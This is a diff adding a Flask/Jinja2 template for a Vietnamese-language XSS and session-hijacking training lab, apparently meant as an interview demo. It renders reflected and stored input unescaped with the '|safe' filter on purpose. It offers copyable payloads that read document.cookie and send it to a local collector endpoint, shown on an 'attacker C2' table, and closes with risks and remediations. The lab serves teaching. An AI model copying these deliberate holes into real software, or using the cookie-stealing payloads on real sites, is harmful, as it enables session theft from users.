@@ -1,0 +1,632 @@
+{% extends "base.html" %}
+{% block title %}XSS & Session Hijacking Demo — Cyber Security Lab{% endblock %}
+{% block content %}
+
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&display=swap');
+
+  :root {
+    --cyan: #00e5ff;
+    --cyan-glow: rgba(0, 229, 255, 0.35);
+    --green: #00ff88;
+    --green-glow: rgba(0, 255, 136, 0.35);
+    --red: #ff2244;
+    --red-glow: rgba(255, 34, 68, 0.35);
+    --bg-dark: rgba(13, 16, 24, 0.92);
+    --border-dim: rgba(255, 255, 255, 0.08);
+  }
+
+  .xss-wrap {
+    max-width: 1150px;
+    margin: 0 auto 3.5rem;
+    font-family: 'Rajdhani', sans-serif;
+    color: var(--text);
+  }
+
+  /* BANNER */
+  .xss-banner {
+    background: var(--bg-dark);
+    border: 1px solid rgba(255, 34, 68, 0.35);
+    border-radius: 4px;
+    padding: 1.6rem 2rem;
+    margin-bottom: 1.8rem;
+    position: relative;
+    overflow: hidden;
+    backdrop-filter: blur(8px);
+    box-shadow: 0 0 25px rgba(255, 34, 68, 0.08);
+  }
+  .xss-banner::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; width: 4px; height: 100%;
+    background: var(--red);
+  }
+  .xss-badge {
+    display: inline-block;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: .68rem;
+    padding: 2px 8px;
+    background: rgba(255, 34, 68, 0.12);
+    border: 1px solid rgba(255, 34, 68, 0.4);
+    color: var(--red);
+    letter-spacing: .12em;
+    text-transform: uppercase;
+    font-weight: 700;
+    margin-bottom: .6rem;
+  }
+  .cookie-pill {
+    float: right;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: .8rem;
+    background: rgba(0, 229, 255, 0.08);
+    border: 1px solid rgba(0, 229, 255, 0.3);
+    color: var(--cyan);
+    padding: .45rem .9rem;
+    border-radius: 4px;
+  }
+
+  /* TABS NAV */
+  .xss-tabs {
+    display: flex;
+    gap: .5rem;
+    margin-bottom: 1.6rem;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+    padding-bottom: .5rem;
+    flex-wrap: wrap;
+  }
+  .tab-item-btn {
+    background: rgba(10, 14, 20, 0.8);
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    color: var(--text-dim);
+    padding: .75rem 1.4rem;
+    font-family: 'Rajdhani', sans-serif;
+    font-size: .95rem;
+    font-weight: 700;
+    cursor: pointer;
+    border-radius: 4px 4px 0 0;
+    transition: all .2s;
+    display: flex;
+    align-items: center;
+    gap: .5rem;
+  }
+  .tab-item-btn:hover {
+    color: #fff;
+    background: rgba(255, 34, 68, 0.08);
+  }
+  .tab-item-btn.active {
+    color: #fff;
+    border-color: var(--red);
+    border-bottom: 2px solid var(--red);
+    background: rgba(255, 34, 68, 0.14);
+    box-shadow: 0 -4px 12px rgba(255, 34, 68, 0.15);
+  }
+
+  .tab-panel {
+    display: none;
+    animation: fadeIn .25s ease;
+  }
+  .tab-panel.active {
+    display: block;
+  }
+
+  /* CARDS & PANELS */
+  .xss-card {
+    background: var(--bg-dark);
+    border: 1px solid var(--border-dim);
+    border-radius: 4px;
+    padding: 1.6rem;
+    margin-bottom: 1.8rem;
+    backdrop-filter: blur(6px);
+  }
+  .xss-card-hdr {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+    padding-bottom: .8rem;
+    margin-bottom: 1.2rem;
+    flex-wrap: wrap;
+    gap: .6rem;
+  }
+  .xss-card-title {
+    font-size: 1.25rem;
+    font-weight: 700;
+    color: #fff;
+    display: flex;
+    align-items: center;
+    gap: .6rem;
+  }
+
+  /* FORMS & INPUTS */
+  .xss-input {
+    width: 100%;
+    padding: .75rem 1rem;
+    background: rgba(5, 7, 10, 0.85);
+    border: 1px solid rgba(255, 255, 255, 0.15);
+    border-radius: 4px;
+    color: #fff;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: .9rem;
+    margin-bottom: .8rem;
+    box-sizing: border-box;
+    outline: none;
+    transition: all .2s;
+  }
+  .xss-input:focus {
+    border-color: var(--red);
+    box-shadow: 0 0 12px var(--red-glow);
+  }
+  .btn-action-red {
+    padding: .65rem 1.6rem;
+    background: rgba(255, 34, 68, 0.18);
+    border: 1px solid var(--red);
+    color: #fff;
+    border-radius: 3px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: .82rem;
+    font-weight: 700;
+    cursor: pointer;
+    text-transform: uppercase;
+    transition: all .2s;
+    display: inline-flex;
+    align-items: center;
+    gap: .5rem;
+  }
+  .btn-action-red:hover {
+    background: var(--red);
+    box-shadow: 0 0 18px var(--red-glow);
+  }
+  .btn-action-cyan {
+    padding: .65rem 1.6rem;
+    background: rgba(0, 229, 255, 0.18);
+    border: 1px solid var(--cyan);
+    color: #fff;
+    border-radius: 3px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: .82rem;
+    font-weight: 700;
+    cursor: pointer;
+    text-transform: uppercase;
+    transition: all .2s;
+    display: inline-flex;
+    align-items: center;
+    gap: .5rem;
+  }
+  .btn-action-cyan:hover {
+    background: var(--cyan);
+    color: #000;
+    box-shadow: 0 0 18px var(--cyan-glow);
+  }
+
+  /* CODE BOX & PAYLOAD COPY */
+  .code-box {
+    background: #030508;
+    border: 1px solid rgba(0, 229, 255, 0.25);
+    border-radius: 4px;
+    padding: .9rem 1.2rem;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: .82rem;
+    color: #00ff88;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin: .8rem 0;
+    word-break: break-all;
+  }
+  .btn-copy {
+    padding: 3px 10px;
+    background: rgba(0, 229, 255, 0.1);
+    border: 1px solid var(--cyan);
+    color: var(--cyan);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: .72rem;
+    border-radius: 3px;
+    cursor: pointer;
+    margin-left: 1rem;
+    flex-shrink: 0;
+    transition: all .2s;
+  }
+  .btn-copy:hover {
+    background: var(--cyan);
+    color: #000;
+  }
+
+  /* POSTS LIST (STORED XSS) */
+  .post-item {
+    background: rgba(20, 24, 34, 0.7);
+    border: 1px solid rgba(255, 255, 255, 0.08);
+    border-radius: 4px;
+    padding: 1rem 1.2rem;
+    margin-bottom: .8rem;
+    transition: border-color .2s;
+  }
+  .post-item:hover {
+    border-color: rgba(255, 34, 68, 0.3);
+  }
+  .post-header {
+    display: flex;
+    justify-content: space-between;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: .72rem;
+    color: var(--text-dim);
+    margin-bottom: .4rem;
+  }
+  .post-author {
+    color: var(--cyan);
+    font-weight: 700;
+  }
+  .post-content-raw {
+    font-size: .95rem;
+    color: #fff;
+    line-height: 1.5;
+  }
+
+  /* ATTACKER VIEW TABLE */
+  .term-c2-box {
+    background: #020406;
+    border: 1px solid rgba(0, 255, 136, 0.3);
+    border-radius: 4px;
+    padding: 1.2rem;
+    box-shadow: 0 0 25px rgba(0, 255, 136, 0.08);
+  }
+  .c2-tbl {
+    width: 100%;
+    border-collapse: collapse;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: .8rem;
+    margin-top: .8rem;
+  }
+  .c2-tbl th {
+    text-align: left;
+    padding: .6rem .8rem;
+    background: rgba(0, 255, 136, 0.1);
+    color: var(--green);
+    border-bottom: 1px solid rgba(0, 255, 136, 0.3);
+    font-size: .75rem;
+    text-transform: uppercase;
+  }
+  .c2-tbl td {
+    padding: .65rem .8rem;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+    color: #c0c8d8;
+  }
+  .c2-tbl tr.highlight {
+    background: rgba(0, 255, 136, 0.15);
+    animation: flashRow 2s ease;
+  }
+  @keyframes flashRow {
+    0% { background: rgba(0, 255, 136, 0.4); }
+    100% { background: transparent; }
+  }
+
+  /* KNOWLEDGE & REMEDIATION CARDS */
+  .grid-2-info {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 1.5rem;
+    margin-top: 2rem;
+  }
+  @media(max-width: 820px) {
+    .grid-2-info { grid-template-columns: 1fr; }
+  }
+  .info-box {
+    background: rgba(10, 14, 22, 0.85);
+    border: 1px solid var(--border-dim);
+    border-radius: 4px;
+    padding: 1.4rem;
+  }
+  .info-title {
+    font-size: 1.15rem;
+    font-weight: 700;
+    margin-bottom: .8rem;
+    display: flex;
+    align-items: center;
+    gap: .5rem;
+  }
+  .info-box.risk .info-title { color: var(--red); }
+  .info-box.defense .info-title { color: var(--cyan); }
+  .info-list {
+    font-size: .88rem;
+    line-height: 1.65;
+    color: #dde0e8;
+  }
+  .info-list li {
+    margin-bottom: .5rem;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(6px); }
+    to { opacity: 1; transform: none; }
+  }
+</style>
+
+<div class="xss-wrap">
+
+  <!-- BANNER TỔNG QUAN -->
+  <div class="xss-banner">
+    <div class="cookie-pill">
+      <i class="fa-solid fa-cookie-bite"></i> Cookie Giả Lập: <strong>{{ demo_token }}</strong>
+      <div style="font-size:.65rem;color:var(--text-dim);margin-top:2px;">(Simulated Demo Token · Không chứa session Flask thật)</div>
+    </div>
+    <span class="xss-badge"><i class="fa-solid fa-shield-virus"></i> PHÒNG THỰC HÀNH TẤN CÔNG & PHÒNG THỦ WEB</span>
+    <h1 style="font-size:1.85rem;color:#fff;margin-bottom:.4rem;">
+      <i class="fa-solid fa-bug" style="color:var(--red);"></i> XSS &amp; Session Hijacking Live Demo
+    </h1>
+    <p style="font-size:.92rem;color:var(--text);line-height:1.6;max-width:850px;">
+      Mô phỏng chuỗi tấn công <strong>Cross-Site Scripting (XSS)</strong> dẫn tới <strong>Chiếm đoạt phiên làm việc (Session Hijacking)</strong>. Dữ liệu token được cách ly an toàn bằng cơ chế Cookie giả lập riêng của phòng Lab, đảm bảo đạo đức kiểm thử mà vẫn thể hiện trọn vẹn kỹ thuật cho buổi phỏng vấn.
+    </p>
+  </div>
+
+  <!-- TABS ĐIỀU HƯỚNG -->
+  <div class="xss-tabs">
+    <button class="tab-item-btn active" onclick="switchXssTab(event, 'tab-reflected')">
+      <i class="fa-solid fa-bolt"></i> 1. Reflected XSS
+    </button>
+    <button class="tab-item-btn" onclick="switchXssTab(event, 'tab-stored')">
+      <i class="fa-solid fa-database"></i> 2. Stored XSS (Guestbook)
+    </button>
+    <button class="tab-item-btn" onclick="switchXssTab(event, 'tab-hijack')">
+      <i class="fa-solid fa-tower-broadcast"></i> 3. Session Hijacking &amp; Attacker View
+    </button>
+  </div>
+
+  <!-- TAB 1: REFLECTED XSS -->
+  <div class="tab-panel active" id="tab-reflected">
+    <div class="xss-card">
+      <div class="xss-card-hdr">
+        <div class="xss-card-title">
+          <i class="fa-solid fa-magnifying-glass" style="color:var(--cyan);"></i> Thử Nghiệm Reflected XSS (Phản Chiếu Đầu Vào)
+        </div>
+        <span style="font-family:'Share Tech Mono',monospace;font-size:.72rem;color:var(--text-dim);">METHOD: HTTP GET</span>
+      </div>
+
+      <p style="font-size:.88rem;color:var(--text);line-height:1.6;margin-bottom:1rem;">
+        Hệ thống nhận tham số <code>reflected_input</code> từ URL và render trực tiếp ra giao diện mà không qua cơ chế Output Encoding. Hãy thử nhập mã JavaScript để kiểm tra lỗ hổng:
+      </p>
+
+      <div class="code-box">
+        <span>&lt;script&gt;alert('Reflected XSS - Cookie: ' + document.cookie)&lt;/script&gt;</span>
+        <button class="btn-copy" onclick="copyText('<script>alert(\'Reflected XSS - Cookie: \' + document.cookie)</script>')">Copy</button>
+      </div>
+
+      <form action="{{ url_for('xss_session_lab') }}" method="GET" style="margin-top:1.2rem;">
+        <label style="font-family:'Share Tech Mono',monospace;font-size:.75rem;color:#fff;display:block;margin-bottom:.4rem;">
+          NHẬP DỮ LIỆU ĐẦU VÀO (REFLECTED INPUT):
+        </label>
+        <input type="text" name="reflected_input" class="xss-input" placeholder="Nhập tên hoặc đoạn script thử nghiệm..." value="{{ reflected_input }}">
+        <button type="submit" class="btn-action-red">
+          <i class="fa-solid fa-paper-plane"></i> Gửi Yêu Cầu (GET)
+        </button>
+      </form>
+
+      {% if reflected_input %}
+      <div style="margin-top:1.5rem;padding:1.2rem;background:#05070a;border:1px dashed rgba(255,34,68,.4);border-radius:4px;">
+        <div style="font-family:'Share Tech Mono',monospace;font-size:.7rem;color:var(--red);margin-bottom:.4rem;">
+          [KẾT QUẢ RENDER RAW - KHÔNG ESCAPE TỪ MÁY CHỦ]:
+        </div>
+        <!-- VỊ TRÍ MINH HỌA REFLECTED XSS: RENDER RAW BẰNG JINJA2 SAFE FILTER -->
+        <div class="raw-output-box" style="font-size:.95rem;color:#fff;">
+          {{ reflected_input|safe }}
+        </div>
+      </div>
+      {% endif %}
+    </div>
+  </div>
+
+  <!-- TAB 2: STORED XSS -->
+  <div class="tab-panel" id="tab-stored">
+    <div class="xss-card">
+      <div class="xss-card-hdr">
+        <div class="xss-card-title">
+          <i class="fa-solid fa-comments" style="color:var(--red);"></i> Thử Nghiệm Stored XSS (Lưu Trữ Trong Cơ Sở Dữ Liệu)
+        </div>
+        <form action="{{ url_for('reset_xss_posts') }}" method="POST" style="margin:0;">
+          <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
+          <button type="submit" class="btn-action-cyan" style="padding:.4rem 1rem;font-size:.75rem;">
+            <i class="fa-solid fa-rotate-right"></i> Xóa Toàn Bộ Demo Post (Reset)
+          </button>
+        </form>
+      </div>
+
+      <p style="font-size:.88rem;color:var(--text);line-height:1.6;margin-bottom:1rem;">
+        Bình luận dưới đây được lưu vĩnh viễn vào cơ sở dữ liệu SQLite (bảng <code>XSSDemoPost</code>). Khi người dùng khác truy cập trang, trình duyệt của họ sẽ tự động thực thi script độc hại được lưu trữ:
+      </p>
+
+      <div class="code-box">
+        <span>&lt;script&gt;alert('Stored XSS - ' + document.cookie)&lt;/script&gt;</span>
+        <button class="btn-copy" onclick="copyText('<script>alert(\'Stored XSS - \' + document.cookie)</script>')">Copy</button>
+      </div>
+
+      <!-- FORM POST STORED XSS -->
+      <form action="{{ url_for('xss_session_lab') }}" method="POST" style="margin:1.2rem 0 2rem;">
+        <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
+        <label style="font-family:'Share Tech Mono',monospace;font-size:.75rem;color:#fff;display:block;margin-bottom:.4rem;">
+          NỘI DUNG BÌNH LUẬN (AUTHOR: {{ current_user.username }}):
+        </label>
+        <textarea name="content" class="xss-input" rows="3" placeholder="Nhập nội dung bình luận hoặc chèn script HTML/JS thô..."></textarea>
+        <button type="submit" class="btn-action-red">
+          <i class="fa-solid fa-cloud-arrow-up"></i> Lưu Vào Cơ Sở Dữ Liệu (POST)
+        </button>
+      </form>
+
+      <!-- DANH SÁCH POSTS (RENDER RAW BẰNG SAFE FILTER) -->
+      <h3 style="font-size:1.1rem;color:#fff;margin-bottom:.8rem;border-bottom:1px solid rgba(255,255,255,0.06);padding-bottom:.4rem;">
+        <i class="fa-solid fa-list-ul" style="color:var(--cyan);"></i> Danh sách bình luận gần nhất (Raw HTML View):
+      </h3>
+
+      <div class="posts-list">
+        {% for p in stored_posts %}
+        <div class="post-item">
+          <div class="post-header">
+            <span class="post-author"><i class="fa-solid fa-user-circle"></i> {{ p.author }}</span>
+            <span><i class="fa-solid fa-clock"></i> {{ p.timestamp.strftime('%H:%M:%S %d/%m/%Y') }}</span>
+          </div>
+          <!-- VỊ TRÍ MINH HỌA STORED XSS: RENDER RAW BẰNG JINJA2 SAFE FILTER -->
+          <div class="post-content-raw">
+            {{ p.content|safe }}
+          </div>
+        </div>
+        {% else %}
+        <p style="font-size:.85rem;color:var(--text-dim);font-family:'Share Tech Mono',monospace;">Chưa có bình luận nào.</p>
+        {% endfor %}
+      </div>
+    </div>
+  </div>
+
+  <!-- TAB 3: SESSION HIJACKING & ATTACKER VIEW -->
+  <div class="tab-panel" id="tab-hijack">
+    <div class="xss-card">
+      <div class="xss-card-hdr">
+        <div class="xss-card-title">
+          <i class="fa-solid fa-user-secret" style="color:var(--green);"></i> Mô Phỏng Chiếm Đoạt Phiên (Session Hijacking)
+        </div>
+        <span style="font-family:'Share Tech Mono',monospace;font-size:.72rem;color:var(--green);">LIVE EXFILTRATION CHANNEL</span>
+      </div>
+
+      <p style="font-size:.88rem;color:var(--text);line-height:1.6;margin-bottom:.8rem;">
+        Trong kịch bản thực tế, kẻ tấn công không chỉ dừng lại ở popup <code>alert()</code> mà sẽ âm thầm đánh cắp Cookie phiên gửi về máy chủ của kẻ tấn công (C2/Collector).
+      </p>
+
+      <div style="background:rgba(0,255,136,0.05);border-left:3px solid var(--green);padding:.8rem 1rem;margin-bottom:1.2rem;font-size:.86rem;color:#d0ffe0;line-height:1.5;">
+        <strong><i class="fa-solid fa-lightbulb"></i> Hướng Dẫn Thực Hành Demo:</strong><br>
+        1. Sao chép Payload Exfiltration bên dưới.<br>
+        2. Chuyển sang <strong>Tab 2 (Stored XSS)</strong>, dán payload này vào ô bình luận và bấm <strong>Lưu vào CSDL</strong>.<br>
+        3. Quay lại Tab này hoặc mở một tab trình duyệt khác tải trang: Cookie <code>xss_demo_token</code> sẽ lập tức được gửi về và xuất hiện thời gian thực trên bảng <strong>Attacker View</strong> bên dưới!
+      </div>
+
+      <!-- PAYLOAD EXFILTRATION SẴN DÙNG -->
+      <label style="font-family:'Share Tech Mono',monospace;font-size:.75rem;color:#fff;display:block;margin-bottom:.4rem;">
+        PAYLOAD EXFILTRATION (FETCH API):
+      </label>
+      <div class="code-box">
+        <span>&lt;script&gt;fetch('/xss_session_lab/collector?token=' + encodeURIComponent(document.cookie))&lt;/script&gt;</span>
+        <button class="btn-copy" onclick="copyText('<script>fetch(\'/xss_session_lab/collector?token=\' + encodeURIComponent(document.cookie))</script>')">Copy Payload</button>
+      </div>
+
+      <label style="font-family:'Share Tech Mono',monospace;font-size:.75rem;color:#fff;display:block;margin-top:.8rem;margin-bottom:.4rem;">
+        PAYLOAD DỰ PHÒNG (NEW IMAGE):
+      </label>
+      <div class="code-box">
+        <span>&lt;script&gt;new Image().src='/xss_session_lab/collector?token=' + encodeURIComponent(document.cookie)&lt;/script&gt;</span>
+        <button class="btn-copy" onclick="copyText('<script>new Image().src=\'/xss_session_lab/collector?token=\' + encodeURIComponent(document.cookie)</script>')">Copy Payload</button>
+      </div>
+
+      <!-- ATTACKER VIEW LIVE TABLE -->
+      <div class="term-c2-box" style="margin-top:1.8rem;">
+        <div style="display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid rgba(0,255,136,0.2);padding-bottom:.6rem;">
+          <div style="font-family:'Share Tech Mono',monospace;font-size:.85rem;color:var(--green);font-weight:700;">
+            <i class="fa-solid fa-terminal"></i> ATTACKER C2 VIEW · REAL-TIME CAPTURED TOKENS (SOCKETIO: /soc)
+          </div>
+          <span style="font-family:'Share Tech Mono',monospace;font-size:.7rem;color:var(--green);background:rgba(0,255,136,0.15);padding:2px 8px;border-radius:2px;">
+            <span style="display:inline-block;width:7px;height:7px;border-radius:50%;background:#00ff88;margin-right:4px;animation:pulse 1.2s infinite;"></span> LISTENING
+          </span>
+        </div>
+
+        <table class="c2-tbl" id="c2-captured-table">
+          <thead>
+            <tr>
+              <th style="width:110px;">Thời Gian</th>
+              <th style="width:140px;">IP Nguồn</th>
+              <th>Cookie / Token Đánh Cắp Được (Exfiltrated)</th>
+              <th style="width:110px;">Trạng Thái</th>
+            </tr>
+          </thead>
+          <tbody id="c2-captured-tbody">
+            {% for t in captured_tokens %}
+            <tr>
+              <td>{{ t.timestamp.strftime('%H:%M:%S') }}</td>
+              <td><code>{{ t.source_ip }}</code></td>
+              <td style="color:#00ff88;word-break:break-all;"><code>{{ t.token_value }}</code></td>
+              <td><span style="color:#00e5ff;">CAPTURED</span></td>
+            </tr>
+            {% else %}
+            <tr id="c2-empty-row">
+              <td colspan="4" style="text-align:center;color:var(--text-dim);padding:1.4rem;">
+                Chưa có token nào bị exfiltrate. Hãy dán payload vào mục Stored XSS để bắt đầu!
+              </td>
+            </tr>
+            {% endfor %}
+          </tbody>
+        </table>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- PHẦN THÔNG TIN KIẾN THỨC BỔ TRỢ PHỎNG VẤN -->
+  <div class="grid-2-info">
+
+    <div class="info-box risk">
+      <div class="info-title">
+        <i class="fa-solid fa-triangle-exclamation"></i> Giải Thích Rủi Ro Thực Tế (Business Impact)
+      </div>
+      <ul class="info-list">
+        <li><strong>Chiếm đoạt phiên làm việc (Session Hijacking):</strong> Khi kẻ tấn công có được session cookie, chúng có thể nạp cookie vào trình duyệt để mạo danh hoàn toàn người dùng mà không cần biết mật khẩu và vượt qua cơ chế 2FA/MFA.</li>
+        <li><strong>Vô hiệu hóa cơ chế phòng chống CSRF:</strong> Khác với tấn công CSRF thông thường (bị chặn bởi Anti-CSRF token), mã XSS thực thi trực tiếp trong trang web có thể đọc Anti-CSRF token từ DOM và gửi request thay người dùng.</li>
+        <li><strong>Nguy cơ đặc quyền tối cao:</strong> Nếu nạn nhân xem trang Stored XSS là Quản trị viên (Admin), toàn bộ hệ thống có nguy cơ bị kiểm soát, rò rỉ cơ sở dữ liệu hoặc bị chèn backdoor.</li>
+      </ul>
+    </div>
+
+    <div class="info-box defense">
+      <div class="info-title">
+        <i class="fa-solid fa-shield-halved"></i> Biện Pháp Phòng Thủ Chuẩn (Remediation)
+      </div>
+      <ul class="info-list">
+        <li><strong>Context-Aware Output Encoding:</strong> Mã hóa toàn bộ dữ liệu đầu vào không đáng tin cậy trước khi render ra HTML (HTML Entity, Attribute, JavaScript, URL encoding).</li>
+        <li><strong>Cờ Bảo Vệ Cookie (HttpOnly, Secure, SameSite):</strong> Bật cờ <code>HttpOnly</code> cấm JavaScript truy cập qua <code>document.cookie</code>. <em>(Ghi chú: Cookie session thật của Flask-Login trong hệ thống này đã được bảo vệ bằng HttpOnly, do đó lab sử dụng cookie giả lập riêng để demo)</em>.</li>
+        <li><strong>Content Security Policy (CSP):</strong> Triển khai HTTP Header CSP chặn inline scripts (cấm <code>unsafe-inline</code>) và kiểm soát chặt chẽ các miền được phép kết nối qua <code>connect-src</code>.</li>
+        <li><strong>Input Validation &amp; Sanitization:</strong> Áp dụng whitelist validation cho dữ liệu đầu vào ở tầng backend.</li>
+      </ul>
+    </div>
+
+  </div>
+
+</div>
+
+<script>
+  // Chuyển Tab
+  function switchXssTab(evt, tabId) {
+    document.querySelectorAll('.tab-item-btn').forEach(btn => btn.classList.remove('active'));
+    document.querySelectorAll('.tab-panel').forEach(panel => panel.classList.remove('active'));
+    evt.currentTarget.classList.add('active');
+    document.getElementById(tabId).classList.add('active');
+  }
+
+  // Copy text nhanh
+  function copyText(str) {
+    navigator.clipboard.writeText(str).then(() => {
+      alert('Đã sao chép payload vào bộ nhớ tạm (Clipboard)!');
+    }).catch(err => {
+      prompt('Hãy copy đoạn mã này:', str);
+    });
+  }
+
+  // SocketIO Real-time Listener cho bảng Attacker C2 View
+  document.addEventListener('DOMContentLoaded', function () {
+    try {
+      const socket = io('/soc');
+      socket.on('xss_token_captured', function (data) {
+        const tbody = document.getElementById('c2-captured-tbody');
+        const emptyRow = document.getElementById('c2-empty-row');
+        if (emptyRow) {
+          emptyRow.remove();
+        }
+
+        const tr = document.createElement('tr');
+        tr.className = 'highlight';
+        tr.innerHTML = `
+          <td>${data.timestamp}</td>
+          <td><code>${data.source_ip}</code></td>
+          <td style="color:#00ff88;word-break:break-all;"><code>${data.token}</code></td>
+          <td><span style="color:#00ff88;font-weight:700;">LIVE CAPTURED</span></td>
+        `;
+
+        tbody.insertBefore(tr, tbody.firstChild);
+      });
+    } catch (e) {
+      console.warn('SocketIO initialization info:', e);
+    }
+  });
+</script>
+
+{% endblock %}
